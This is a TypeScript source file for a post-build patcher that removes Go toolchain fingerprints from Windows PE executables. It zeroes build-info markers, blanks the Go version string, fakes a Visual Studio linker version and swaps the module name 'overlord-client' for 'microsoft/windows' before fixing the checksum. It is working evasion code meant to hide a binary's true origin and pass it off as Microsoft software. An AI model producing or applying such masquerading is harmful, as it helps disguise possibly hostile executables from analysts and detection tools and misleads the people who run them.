// PE post-build patcher: removes Go toolchain fingerprints from Windows PE binaries.
// Patches: go.buildinfo magic, linker version fields, go version string,
//          module path strings, and recalculates the PE checksum.

export interface PePatchOptions {
  patchLinkerVersion?: boolean;
  zeroGoBuildInfo?: boolean;
  patchGoVersion?: boolean;
  patchModulePath?: boolean;
  moduleName?: string;        // e.g. "overlord-client"
  fakeModuleName?: string;    // replacement, same byte length required → auto-truncated/padded
  fixChecksum?: boolean;
}

const DEFAULT_OPTS: Required<PePatchOptions> = {
  patchLinkerVersion: true,
  zeroGoBuildInfo: true,
  patchGoVersion: true,
  patchModulePath: true,
  moduleName: "overlord-client",
  fakeModuleName: "microsoft/windows",
  fixChecksum: true,
};

/** Returns a patched copy of the PE buffer. Never modifies the input. */
export function patchPe(input: Buffer, opts: PePatchOptions = {}): Buffer {
  const o = { ...DEFAULT_OPTS, ...opts };
  const buf = Buffer.from(input); // copy

  // ── Validate PE ───────────────────────────────────────────────────────────
  if (buf.length < 0x40) return buf;
  if (buf[0] !== 0x4d || buf[1] !== 0x5a) return buf; // not MZ
  const eLfanew = buf.readUInt32LE(0x3c);
  if (eLfanew + 24 > buf.length) return buf;
  if (buf.readUInt32LE(eLfanew) !== 0x00004550) return buf; // not PE\0\0

  const optHdrOff = eLfanew + 24; // start of Optional Header

  // ── 1. Patch linker version → VS2019 (14.29) ─────────────────────────────
  if (o.patchLinkerVersion && optHdrOff + 4 <= buf.length) {
    buf[optHdrOff + 2] = 14; // MajorLinkerVersion
    buf[optHdrOff + 3] = 29; // MinorLinkerVersion
  }

  // ── 2. Zero go.buildinfo magic ────────────────────────────────────────────
  // The Go toolchain embeds a magic marker that `go version -m` reads.
  // Zeroing it breaks that lookup without affecting execution.
  if (o.zeroGoBuildInfo) {
    const magic = Buffer.from("\xff Go buildinf:", "binary");
    let pos = 0;
    while ((pos = buf.indexOf(magic, pos)) !== -1) {
      const end = Math.min(pos + 512, buf.length);
      buf.fill(0, pos, end);
      pos = end;
    }
  }

  // ── 3. Patch go1.XX.Y version string ─────────────────────────────────────
  // Replace the first occurrence of "go1." + version digits with spaces.
  if (o.patchGoVersion) {
    const goPrefix = Buffer.from("go1.", "ascii");
    let pos = 0;
    while ((pos = buf.indexOf(goPrefix, pos)) !== -1) {
      // Make sure this is a real version string: digits/dots/letters follow
      let end = pos + 4;
      while (end < buf.length && end - pos < 20 && buf[end] !== 0 && buf[end] !== 0x20) {
        end++;
      }
      const candidate = buf.slice(pos, end).toString("ascii");
      if (/^go1\.\d+/.test(candidate)) {
        buf.fill(0x20, pos, end); // overwrite with spaces
        pos = end;
        break; // only the first occurrence matters (others are in .rodata copies)
      }
      pos++;
    }
  }

  // ── 4. Patch module path ("overlord-client/" → fake name) ─────────────────
  if (o.patchModulePath && o.moduleName) {
    const needle = Buffer.from(o.moduleName + "/", "ascii");
    const replacement = Buffer.from(
      (o.fakeModuleName + "/").substring(0, needle.length).padEnd(needle.length, " "),
      "ascii",
    );
    let pos = 0;
    while ((pos = buf.indexOf(needle, pos)) !== -1) {
      replacement.copy(buf, pos);
      pos += needle.length;
    }
  }

  // ── 5. Recalculate PE checksum ────────────────────────────────────────────
  if (o.fixChecksum) {
    const checksumOffset = eLfanew + 88; // OptHdr is at eLfanew+24; checksum at OptHdr+64
    if (checksumOffset + 4 <= buf.length) {
      buf.writeUInt32LE(0, checksumOffset); // zero first
      const computed = computePeChecksum(buf, checksumOffset);
      buf.writeUInt32LE(computed, checksumOffset);
    }
  }

  return buf;
}

/**
 * Compute the standard Windows PE checksum.
 * Algorithm: sum all 16-bit words (skip the checksum field), fold carries, add file size.
 */
function computePeChecksum(buf: Buffer, checksumFieldOffset: number): number {
  let checksum = 0;
  const len = buf.length;

  for (let i = 0; i < len; i += 2) {
    if (i === checksumFieldOffset) continue; // skip the checksum field itself
    const word = i + 1 < len ? buf.readUInt16LE(i) : buf[i]; // handle odd length
    checksum += word;
    if (checksum > 0xffff) {
      checksum = (checksum & 0xffff) + (checksum >>> 16);
    }
  }

  // Final fold
  checksum = (checksum & 0xffff) + (checksum >>> 16);
  checksum &= 0xffff;
  checksum += len;
  return checksum >>> 0;
}
